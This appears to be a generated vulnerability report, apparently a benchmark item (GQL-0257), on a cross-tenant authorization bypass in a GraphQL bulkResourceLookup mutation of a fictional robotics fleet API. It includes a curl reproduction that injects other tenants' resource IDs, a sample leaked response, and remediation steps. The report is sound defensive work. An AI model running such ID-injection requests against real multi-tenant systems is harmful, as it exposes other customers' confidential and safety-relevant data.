# Security Analysis Report
**System:** ManuControl Robotics Fleet — v2.2.1 (FINAL)
**Domain:** Industrial IoT / Manufacturing
**Example ID:** GQL-0257
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.1 | Authorization-bypass injection via `bulkResourceLookup` — attacker injects cross-tenant robot fleet resource IDs |

---

## Finding 1 — Injection: Authorization-Bypass via Batch ID Injection (Pattern 5.1)

### Summary
The `bulkResourceLookup` GraphQL mutation on ManuControl Robotics Fleet (`api.manucontrol-robotics.example.com`) accepts a caller-supplied list of IDs without per-ID ownership validation. Per §5.0 Pattern 5.1, the attacker injects cross-tenant resource IDs (`R-2257`, `R-1257`, `R-3257`) belonging to `tenant-2aae` into the batch request while authenticated as `tenant-9097`. The resolver processes all supplied IDs without authorization checking, bypassing tenancy boundaries. In an industrial IoT / manufacturing context, resource records may contain robot fleet configurations, production line parameters, safety interlock settings, and manufacturing operator PII.

**HAR artifact note:** The request uses `bulkResourceLookup(ids: ["R-2257","R-1257","R-3257"])` but the response JSON key is `getResource`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 5.1 — Authorization-bypass injection (Injection)
**Affected resolver:** `bulkResourceLookup(ids: [ID!]!)`
**Affected endpoint:** `POST https://api.manucontrol-robotics.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.manucontrol-robotics.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-9097
Content-Type: application/json

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2257\", \"R-1257\", \"R-3257\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Robot Fleet Data Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-2aae",
      "ownerId": "other-user-90972aae",
      "data": {
        "sensitiveField": "CONFIDENTIAL-90972aae",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Note: `x-request-id: req-90972aae` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `resourceId` only — no tenant dimension |
| §3.0 Schema | `bulkResourceLookup(ids: [ID!]!)` — no per-ID ownership filter |
| §4.0 RISK-GQL-257 | `getResource` resolver fetches by `resourceId` only; no tenancy check |
| §5.0 Pattern 5.1 | Authorization-bypass injection — IDs from another tenant injected into batch |
| HAR request | `tenant-9097` injects `["R-2257","R-1257","R-3257"]` spanning `tenant-2aae` |
| HAR response | `CONFIDENTIAL-90972aae` and `internalNotes` from victim tenant returned |

---

## Steps to Reproduce

```bash
# Authenticate as attacker (tenant-9097)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Inject cross-tenant IDs into batch lookup
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.manucontrol-robotics.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-9097" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkResourceLookup(ids: [\"R-2257\", \"R-1257\", \"R-3257\"]) { resourceId tenantId data { sensitiveField } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-90972aae from tenant-2aae
# Expected (secure): Results filtered to tenant-9097 only; cross-tenant IDs return null or FORBIDDEN
```

---

## Remediation

1. **Per-ID ownership filter:** In `bulkResourceLookup`, filter results server-side to only include records where `record.tenantId === $jwt.tenantId` before returning.
2. **Database WHERE clause:** `WHERE resource_id = ANY($ids) AND tenant_id = $jwtTenantId`.
3. **`getResource` check (§4.0 RISK-GQL-257):** `WHERE resource_id = $id AND tenant_id = $jwtTenantId`.
4. **Cache keying:** Include `tenantId` in Redis key: `resource:{tenantId}:{resourceId}`.
5. **Industrial IoT note:** Robot fleet resources may include production line parameters and safety interlock configurations. Cross-tenant access to these records could enable industrial sabotage or production disruption. IEC 62443 industrial security standards mandate strict access control on OT/ICS data.
